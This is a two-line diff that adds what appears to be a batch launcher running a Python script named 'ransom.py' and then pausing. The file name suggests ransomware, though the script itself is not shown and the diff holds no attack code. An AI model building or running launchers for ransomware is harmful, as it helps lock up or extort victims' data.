@@ -1,0 +1,2 @@
+python "ransom.py"
+pause
